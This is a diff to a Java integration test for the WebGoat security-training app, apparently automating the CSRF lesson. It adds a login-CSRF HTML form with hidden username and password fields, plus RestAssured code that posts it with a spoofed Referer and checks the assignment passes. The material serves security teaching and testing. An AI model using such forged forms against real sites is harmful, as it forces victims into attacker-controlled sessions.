@@ -34,6 +34,14 @@ public class CSRFTest extends IntegrationTest {
 			"<input type=\"submit\" value=\"assignment 7\"/>\n" + 
 			"</form></body></html>";
 	
+	private static final String trickHTML8 = "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" method=\"POST\">\n" + 
+			"<input type=\"hidden\" name=\"username\" value=\"csrf-USERNAME\"/>\n" + 
+			"<input type=\"hidden\" name=\"password\" value=\"password\"/>\n" + 
+			"<input type=\"hidden\" name=\"matchingPassword\" value=\"password\"/>\n" + 
+			"<input type=\"hidden\" name=\"agree\" value=\"agree\"/>\n" + 
+			"<input type=\"submit\" value=\"assignment 8\"/>\n" + 
+			"</form></body></html>";
+	
     private String webwolfFileDir;
 	
 	
@@ -55,7 +63,12 @@ public class CSRFTest extends IntegrationTest {
         uploadTrickHtml("csrf7.html", trickHTML7.replace("WEBGOATURL", url("/csrf/feedback/message")));
         checkAssignment7(callTrickHtml("csrf7.html"));
         
-        //checkResults("/csrf");
+        //Assignment 8
+        uploadTrickHtml("csrf8.html", trickHTML8.replace("WEBGOATURL", url("/login")).replace("USERNAME", getWebgoatUser()));
+        checkAssignment8(callTrickHtml("csrf8.html"));
+        
+        login();//because old cookie got replaced and invalidated
+        checkResults("csrf");
         
     }
     
@@ -154,6 +167,70 @@ public class CSRFTest extends IntegrationTest {
         params.put("confirmFlagVal", flag);
         checkAssignment(url("/WebGoat/csrf/feedback"), params, true);
         	
+    }
+    
+    private void checkAssignment8(String goatURL) {
+    	
+    	//first make sure there is an attack csrf- user
+    	registerCSRFUser();
+    	
+    	Map<String, Object> params = new HashMap<>();
+        params.clear();
+        params.put("username", "csrf-"+getWebgoatUser());
+        params.put("password","password");
+        	
+        //login and get the new cookie
+    	String newCookie = RestAssured.given()
+            	.when()
+            	.relaxedHTTPSValidation()
+            	.cookie("JSESSIONID", getWebGoatCookie())
+            	.header("Referer", webWolfUrl("/files/fake.html"))
+            	.params(params)
+            	.log().all()
+            	.post(goatURL)            	
+            	.then().log().all()
+            	.extract().cookie("JSESSIONID");
+  
+    	//select the lesson
+    	RestAssured.given()
+        	.when()
+        	.relaxedHTTPSValidation()
+        	.cookie("JSESSIONID", newCookie)
+        	.get(url("CSRF.lesson.lesson"))
+        	.then()
+        	.statusCode(200);
+    	
+    	//click on the assignment
+    	boolean result = RestAssured.given()
+            	.when()
+            	.relaxedHTTPSValidation()
+            	.cookie("JSESSIONID", newCookie)
+            	.log().all()
+            	.post(url("/csrf/login"))            	
+            	.then()
+            	.log().all()
+            	.statusCode(200)
+            	.extract().path("lessonCompleted");
+    	
+    	//vaidate the result
+    	assertEquals(true, result);
+        	
+    }
+    
+    /**
+     * Try to register the new user. Ignore the result.
+     */
+    public void registerCSRFUser() {
+    	
+       RestAssured.given()
+                    .when()
+                    .relaxedHTTPSValidation()
+                    .formParam("username", "csrf-"+getWebgoatUser())
+                    .formParam("password", "password")
+                    .formParam("matchingPassword", "password")
+                    .formParam("agree", "agree")
+                    .post(url("register.mvc"));
+        
     }
     
 }
